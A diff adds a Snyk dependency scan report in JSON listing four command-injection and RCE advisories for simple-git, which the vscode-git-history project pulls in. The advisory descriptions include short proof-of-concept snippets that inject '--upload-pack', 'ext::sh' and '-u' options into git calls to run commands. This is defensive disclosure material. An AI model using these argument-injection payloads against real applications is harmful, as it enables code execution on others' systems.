@@ -1,0 +1,371 @@
+{
+  "ok": false,
+  "vulnerabilities": [
+    {
+      "id": "SNYK-JS-SIMPLEGIT-2421199",
+      "title": "Command Injection",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
+      "credit": [
+        "Alessio Della Libera of Snyk Research Team"
+      ],
+      "semver": {
+        "vulnerable": [
+          "<3.3.0"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "3.3.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "js",
+      "severity": "high",
+      "cvssScore": 8.1,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "simple-git",
+      "references": [
+        {
+          "url": "https://github.com/steveukx/git-js/pull/767",
+          "title": "Github PR"
+        },
+        {
+          "url": "https://github.com/steveukx/git-js/releases/tag/simple-git%403.3.0",
+          "title": "Github Release"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "critical",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 9.8,
+          "modificationTime": "2022-03-19T04:11:02.340923Z"
+        }
+      ],
+      "description": "## Overview\n[simple-git](https://www.npmjs.com/package/simple-git) is a light weight interface for running git commands in any node.js application.\n\nAffected versions of this package are vulnerable to Command Injection via argument injection. When calling the `.fetch(remote, branch, handlerFn)` function, both the `remote` and `branch` parameters are passed to the `git fetch` subcommand. By injecting some git options it was possible to get arbitrary command execution.\r\n\r\n\r\n## PoC\r\n```js\r\n// npm i simple-git\r\nconst simpleGit = require('simple-git');\r\nconst git = simpleGit();\r\n\r\nlet callback = () => {};\r\n\r\ngit.init(); // or git init\r\n\r\nlet origin1 = 'origin';\r\nlet ref1 = \"--upload-pack=touch ./HELLO1;\";\r\ngit.fetch(origin1, ref1,  callback); // git [ 'fetch', 'origin', '--upload-pack=touch ./HELLO1;' ]\r\n\r\nlet origin2 = \"--upload-pack=touch ./HELLO2;\";\r\nlet ref2 = \"foo\";\r\ngit.fetch(origin2, ref2,  callback); // git [ 'fetch', '--upload-pack=touch ./HELLO2;', 'foo' ]\r\n\r\n\r\nlet origin3 = 'origin';\r\nlet ref3 = \"--upload-pack=touch ./HELLO3;\";\r\ngit.fetch(origin3, ref3, { '--depth': '2' }, callback); // git [ 'fetch', '--depth=2', 'origin', '--upload-pack=touch ./HELLO3;' ]\r\n\r\n// ls -la\r\n```\n## Remediation\nUpgrade `simple-git` to version 3.3.0 or higher.\n## References\n- [Github PR](https://github.com/steveukx/git-js/pull/767)\n- [Github Release](https://github.com/steveukx/git-js/releases/tag/simple-git%403.3.0)\n",
+      "epssDetails": {
+        "percentile": "0.61855",
+        "probability": "0.00252",
+        "modelVersion": "v2023.03.01"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2022-24433"
+        ],
+        "CWE": [
+          "CWE-78"
+        ]
+      },
+      "packageName": "simple-git",
+      "proprietary": true,
+      "creationTime": "2022-03-11T10:50:55.057167Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2022-03-11T10:47:28Z",
+      "packageManager": "npm",
+      "publicationTime": "2022-03-11T14:29:26Z",
+      "modificationTime": "2022-06-08T07:00:27.774927Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "high",
+      "packagePopularityRank": 98,
+      "from": [
+        "vscode-git-cruise@raymon-sun/vscode-git-history#68f117ecfd181de9a90063d8619b48cea6bb1349",
+        "simple-git@2.48.0"
+      ],
+      "upgradePath": [
+        false,
+        "simple-git@3.3.0"
+      ],
+      "version": "2.48.0",
+      "name": "simple-git",
+      "isUpgradable": true,
+      "isPatchable": false,
+      "isPinnable": false
+    },
+    {
+      "id": "SNYK-JS-SIMPLEGIT-2434306",
+      "title": "Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
+      "credit": [
+        "Liran Tal of Snyk"
+      ],
+      "semver": {
+        "vulnerable": [
+          "<3.5.0"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "3.5.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "js",
+      "severity": "high",
+      "cvssScore": 8.1,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "simple-git",
+      "references": [
+        {
+          "url": "https://github.com/steveukx/git-js/commit/2040de601c894363050fef9f28af367b169a56c5",
+          "title": "Github Commit"
+        },
+        {
+          "url": "https://gist.github.com/lirantal/a930d902294b833514e821102316426b",
+          "title": "GitHub Gist"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "critical",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 9.8,
+          "modificationTime": "2022-04-09T13:11:55.632964Z"
+        }
+      ],
+      "description": "## Overview\n[simple-git](https://www.npmjs.com/package/simple-git) is a light weight interface for running git commands in any node.js application.\n\nAffected versions of this package are vulnerable to Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') due to an incomplete fix of [CVE-2022-24433](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2421199) which only patches against the `git fetch` attack vector.\r\nA similar use of the `--upload-pack` feature of git is also supported for git clone, which the prior fix didn't cover.\r\n\r\n## PoC\r\n```js\r\nconst simpleGit = require('simple-git')\r\nconst git2 = simpleGit()\r\ngit2.clone('file:///tmp/zero123', '/tmp/example-new-repo', ['--upload-pack=touch /tmp/pwn']);\r\n```\n## Remediation\nUpgrade `simple-git` to version 3.5.0 or higher.\n## References\n- [Github Commit](https://github.com/steveukx/git-js/commit/2040de601c894363050fef9f28af367b169a56c5)\n- [GitHub Gist](https://gist.github.com/lirantal/a930d902294b833514e821102316426b)\n",
+      "epssDetails": {
+        "percentile": "0.50251",
+        "probability": "0.00151",
+        "modelVersion": "v2023.03.01"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2022-24066"
+        ],
+        "CWE": [
+          "CWE-88"
+        ]
+      },
+      "packageName": "simple-git",
+      "proprietary": true,
+      "creationTime": "2022-03-28T10:41:21.756066Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2022-03-28T10:40:04Z",
+      "packageManager": "npm",
+      "publicationTime": "2022-03-29T14:24:08Z",
+      "modificationTime": "2023-01-09T08:42:54.579695Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "high",
+      "packagePopularityRank": 98,
+      "from": [
+        "vscode-git-cruise@raymon-sun/vscode-git-history#68f117ecfd181de9a90063d8619b48cea6bb1349",
+        "simple-git@2.48.0"
+      ],
+      "upgradePath": [
+        false,
+        "simple-git@3.5.0"
+      ],
+      "version": "2.48.0",
+      "name": "simple-git",
+      "isUpgradable": true,
+      "isPatchable": false,
+      "isPinnable": false
+    },
+    {
+      "id": "SNYK-JS-SIMPLEGIT-3112221",
+      "title": "Remote Code Execution (RCE)",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
+      "credit": [
+        "Sam Wheating"
+      ],
+      "semver": {
+        "vulnerable": [
+          "<3.15.0"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "3.15.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "js",
+      "severity": "high",
+      "cvssScore": 8.1,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "simple-git",
+      "references": [
+        {
+          "url": "https://github.com/steveukx/git-js/commit/774648049eb3e628379e292ea172dccaba610504",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/steveukx/git-js/releases/tag/simple-git%403.15.0",
+          "title": "GitHub Release"
+        },
+        {
+          "url": "https://github.com/steveukx/git-js/blob/main/docs/PLUGIN-UNSAFE-ACTIONS.md%23overriding-allowed-protocols",
+          "title": "Plugin-Unsafe-Actions Documentation"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "critical",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 9.8,
+          "modificationTime": "2022-12-08T01:11:45.128450Z"
+        }
+      ],
+      "description": "## Overview\n[simple-git](https://www.npmjs.com/package/simple-git) is a light weight interface for running git commands in any node.js application.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) when enabling the `ext` transport protocol, which makes it exploitable via `clone()` method.\r\nThis vulnerability exists due to an incomplete fix of [CVE-2022-24066](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2434306).\r\n\r\n## PoC\r\n\r\n```js\r\nconst simpleGit = require('simple-git')\r\nconst git2 = simpleGit()\r\ngit2.clone('ext::sh -c touch% /tmp/pwn% >&2', '/tmp/example-new-repo', [\"-c\", \"protocol.ext.allow=always\"]);\r\n```\n## Remediation\nUpgrade `simple-git` to version 3.15.0 or higher.\n## References\n- [GitHub Commit](https://github.com/steveukx/git-js/commit/774648049eb3e628379e292ea172dccaba610504)\n- [GitHub Release](https://github.com/steveukx/git-js/releases/tag/simple-git%403.15.0)\n- [Plugin-Unsafe-Actions Documentation](https://github.com/steveukx/git-js/blob/main/docs/PLUGIN-UNSAFE-ACTIONS.md#overriding-allowed-protocols)\n",
+      "epssDetails": {
+        "percentile": "0.71132",
+        "probability": "0.00436",
+        "modelVersion": "v2023.03.01"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2022-25912"
+        ],
+        "CWE": [
+          "CWE-94"
+        ]
+      },
+      "packageName": "simple-git",
+      "proprietary": true,
+      "creationTime": "2022-11-10T14:54:09.297840Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2022-11-10T13:55:14Z",
+      "packageManager": "npm",
+      "publicationTime": "2022-12-05T15:30:04.792034Z",
+      "modificationTime": "2022-12-11T10:17:47.000853Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "high",
+      "packagePopularityRank": 98,
+      "from": [
+        "vscode-git-cruise@raymon-sun/vscode-git-history#68f117ecfd181de9a90063d8619b48cea6bb1349",
+        "simple-git@2.48.0"
+      ],
+      "upgradePath": [
+        false,
+        "simple-git@3.15.0"
+      ],
+      "version": "2.48.0",
+      "name": "simple-git",
+      "isUpgradable": true,
+      "isPatchable": false,
+      "isPinnable": false
+    },
+    {
+      "id": "SNYK-JS-SIMPLEGIT-3177391",
+      "title": "Remote Code Execution (RCE)",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
+      "credit": [
+        "Santos Gallegos"
+      ],
+      "semver": {
+        "vulnerable": [
+          "<3.16.0"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "3.16.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "js",
+      "severity": "high",
+      "cvssScore": 8.1,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "simple-git",
+      "references": [
+        {
+          "url": "https://github.com/steveukx/git-js/commit/ec97a39ab60b89e870c5170121cd9c1603cc1951",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/steveukx/git-js/pull/881/commits/95459310e5b8f96e20bb77ef1a6559036b779e13",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "critical",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 9.8,
+          "modificationTime": "2023-02-14T15:02:10.901270Z"
+        }
+      ],
+      "description": "## Overview\n[simple-git](https://www.npmjs.com/package/simple-git) is a light weight interface for running git commands in any node.js application.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) via the `clone()`, `pull()`, `push()` and `listRemote()` methods, due to improper input sanitization.\r\nThis vulnerability exists due to an incomplete fix of [CVE-2022-25912](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221).\r\n\r\n## PoC\r\n\r\n```js\r\nconst simpleGit = require('simple-git');\r\nlet git = simpleGit();\r\ngit.clone('-u touch /tmp/pwn', 'file:///tmp/zero12');\r\ngit.pull('--upload-pack=touch /tmp/pwn0', 'master');\r\ngit.push('--receive-pack=touch /tmp/pwn1', 'master');\r\ngit.listRemote(['--upload-pack=touch /tmp/pwn2', 'main']);\r\n```\n## Remediation\nUpgrade `simple-git` to version 3.16.0 or higher.\n## References\n- [GitHub Commit](https://github.com/steveukx/git-js/commit/ec97a39ab60b89e870c5170121cd9c1603cc1951)\n- [GitHub Commit](https://github.com/steveukx/git-js/pull/881/commits/95459310e5b8f96e20bb77ef1a6559036b779e13)\n",
+      "epssDetails": {
+        "percentile": "0.70758",
+        "probability": "0.00425",
+        "modelVersion": "v2023.03.01"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2022-25860"
+        ],
+        "CWE": [
+          "CWE-94"
+        ]
+      },
+      "packageName": "simple-git",
+      "proprietary": true,
+      "creationTime": "2022-12-20T13:48:05.414657Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2022-12-20T13:16:28Z",
+      "packageManager": "npm",
+      "publicationTime": "2023-01-23T14:04:31.878959Z",
+      "modificationTime": "2023-02-14T15:02:10.901270Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "high",
+      "packagePopularityRank": 98,
+      "from": [
+        "vscode-git-cruise@raymon-sun/vscode-git-history#68f117ecfd181de9a90063d8619b48cea6bb1349",
+        "simple-git@2.48.0"
+      ],
+      "upgradePath": [
+        false,
+        "simple-git@3.16.0"
+      ],
+      "version": "2.48.0",
+      "name": "simple-git",
+      "isUpgradable": true,
+      "isPatchable": false,
+      "isPinnable": false
+    }
+  ],
+  "numDependencies": 75,
+  "severityMap": {
+    "critical": 0,
+    "high": 4,
+    "medium": 0,
+    "low": 0
+  },
+  "org": "bruswei",
+  "packageManager": "npm",
+  "summary": "4 vulnerable dependency paths",
+  "filesystemPolicy": false,
+  "filtered": {
+    "ignore": [],
+    "patch": []
+  },
+  "uniqueCount": 4,
+  "hasUnknownVersions": false,
+  "path": "https://github.com/raymon-sun/vscode-git-history.git"
+}
